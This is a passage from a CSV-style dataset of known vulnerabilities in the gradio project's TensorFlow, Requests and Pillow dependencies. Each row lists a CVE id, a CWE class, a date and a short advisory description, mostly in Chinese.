Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于在TensorFlow受影响版本的抓取器优化阶段，常量折叠可能试图深度复制资源张量。这将导致分段错误，因为这些张量应该是不变的。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-41884,CWE-670,2022-11-18,Google TensorFlow是一款用于机器学习的开源平台。当创建的numpy数组的形状为一个元素为零而其他元素之和为一个大数时，可能导致错误，引发应用程序崩溃。,3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23586,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，恶意用户可以通过更改SavedModel，从而在function中断言，从而导致拒绝服务。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35991,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 TensorListScatter 和 TensorListScatterV2 收到等级大于 1 的 element_shape 时，它们会给出断言失败，这可能会触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23579,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于TensorFlow中的格斗器优化器可以通过修改SavedModel来导致拒绝服务，这样SafeToRemoveIdentity就会触发CHECK失败。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-36016,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 tensorflow::full_type::SubstituteFromAttrs 收到不完全是三个参数的 FullTypeDef& t 时，它会触发 CHECK -fail 而不是返回状态。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-29212,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在输入验证错误漏洞，该漏洞源于应用在使用 TFLite 模型转换器创建的某些 TFLite 模型在加载到 TFLite 解释器时会发生崩溃。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23571,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞攻击者在TensorFlow流程中导致拒绝服务。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-29191,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.GetSessionTensor 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-36013,CWE-476,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于当 mlir::tfg::GraphDefImporter::ConvertNodeDef 尝试在没有操作名称的情况下转换 NodeDef 时，它会崩溃。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41198,CWE-190,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，在受影响的版本中，如果使用大输入参数调用 `tf.tile`，那么 TensorFlow 进程将由于溢出导致的 `CHECK` 失败而崩溃。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35998,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果 EmptyTensorList 接收到具有多个维度的输入 element_shape ，它会给出断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37652,CWE-416 CWE-415,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.5.1，2.4.3和2.3.4存在资源管理错误漏洞，攻击者可以利用该漏洞导致TensorFlow异常终止。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35963,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于 FractionalAvgPoolGrad 的实现没有完全验证输入 orig_input_tensor_shape 。这会导致溢出，导致断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2023-25674,CWE-476,2023-03-24,Google TensorFlow是一个用于机器学习的端到端开源平台。2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在空指针错误，该漏洞源于启用 XLA 的 RandomShuffle 操作。,2,2
gradio-app_gradio,tensorflow,,True,CVE-2022-35974,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于如果 QuantizeDownAndShrinkRange 为 input_min 或 input_max 提供非标量输入，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37658,CWE-824,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于攻击者可以通过在所有类型为 `tf.raw_ops.MatrixSetDiagV*` 的操作中绑定对空指针的引用来导致未定义的行为。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29568,CWE-824 CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2版本、2.3.3版本、2.2.3版本、2.1.4版本存在代码问题漏洞，攻击者可利用该漏洞可以通过绑定tf.raw_ops.ParameterizedTruncatedNormal的空指针来触发未定义的行为。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2022-36017,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于如果 Requantize 被赋予 input_min 、 input_max 、 requested_output_min 、 requested_output_max 非零秩张量，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37636,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于`SparseDenseCwiseDiv` 中的浮点异常。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-41889,CWE-476,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果将量化张量列表分配给属性，则pywrap代码无法解析张量并返回未捕获的‘nullptr’。,3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23573,CWE-908,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于 AssignOp 的实现可以导致将未初始化的数据复制到一个新的张量。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-41900,CWE-125 CWE-787,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞出现在TensorFlow的池化操作中，导致FractionalMax(AVG)Pool具有非法的pooling_ratio，攻击者可以利用此漏洞访问不受用户控制的堆内存。,2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-21731,CWE-843,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于ConcatV2的形状推断实现可用于通过由类型混淆引起的段错误触发拒绝服务攻击。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-36005,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 tf.quantization.fake_quant_with_min_max_vars_gradient 接收到非标量的输入 min 或 max 时，它会给出可能触发拒绝服务攻击的断言失败。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2023-27579,CWE-697,2023-03-24,TensorFlow是一个用于机器学习的端到端开源平台。使用小于1的参数“filter_input_channel”构建tflite模型会导致浮点异常(FPE)。该漏洞在2.12版本中被修复。,2,2
gradio-app_gradio,tensorflow,,True,CVE-2021-37654,CWE-125,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow存在缓冲区错误漏洞，该漏洞源于在受影响的版本中，tf.raw_ops.ResourceGather缺少有效的限制，攻击者可以在TensorFlow的调试版本中执行“检查”-失败，或从发布版本中相同API中的堆分配的边界之外数据读取，来触发崩溃。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-36018,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果为 RaggedTensorToVariant 提供了一个 rt_nested_splits 列表，其中包含除 1 之外的等级张量，则会导致断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37660,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow存在数字错误漏洞，该漏洞源于软件未正确计算或转换所产生的数字。攻击者可利用该漏洞可以通过调用特制的参数的操作导致数据被0除，从而导致浮点异常。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2023-25664,CWE-120 CWE-122,2023-03-24,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于TAvgPoolGrad中存在堆缓冲区溢出，影响版本为2.12.0及之前的版本（不包括2.11.1）。,2,2
gradio-app_gradio,tensorflow,,True,CVE-2022-41888,CWE-20,2022-11-18,TensorFlow是一个用于机器学习的开源平台。在GPU上运行时，`tf.image.generate_bounding_box_proposals`函数收到一个未进行检查的`scores`输入，该输入必须为4级。,3,0
gradio-app_gradio,tensorflow,,True,CVE-2023-25670,CWE-476,2023-03-24,TensorFlow是一个强大的开源机器学习框架，用于构建和训练各种复杂的神经网络模型。在版本2.12.0之前的2.12和版本2.11.1之前的2.11中，QuantizedMatMulWithBiasAndDequantize操作存在零点错误，可能导致空指针解引用问题。,2,2
gradio-app_gradio,tensorflow,,True,CVE-2022-29204,CWE-20 CWE-191,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在安全漏洞，该漏洞源于tf.raw_ops.UnsortedSegmentJoin 对于输入的参数存在不完全验证。攻击者利用该漏洞可以触发断言失败实现拒绝服务攻击。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29585,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，该漏洞源于没有检查stride是否为0。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29602,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，该漏洞源于DepthwiseConvTFLite操作符的实现容易出现被除零错误。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37688,CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于在受影响的版本中，攻击者可以制作一个 TFLite 模型来触发空指针取消引用，这将导致崩溃和拒绝服务。",2,0
gradio-app_gradio,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
gradio-app_gradio,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
gradio-app_gradio,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
gradio-app_gradio,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
gradio-app_gradio,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
gradio-app_gradio,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
gradio-app_gradio,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
gradio-app_gradio,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
gradio-app_gradio,pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
gradio-app_gradio,pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
gradio-app_gradio,pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
gradio-app_gradio,pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
gradio-app_gradio,pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
gradio-app_gradio,pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
gradio-app_gradio,pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
gradio-app_gradio,pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
gradio-app_gradio,pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
gradio-app_gradio,pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
gradio-app_gradio,pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
gradio-app_gradio,pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
gradio-app_gradio,pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
gradio-app_gradio,pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
gradio-app_gradio,pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
gradio-app_gradio,pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
gradio-app_gradio,pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
gradio-app_gradio,pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
gradio-app_gradio,pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
gradio-app_gradio,pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
gradio-app_gradio,pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
gradio-app_gradio,pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
gradio-app_gradio,pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
gradio-app_gradio,pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

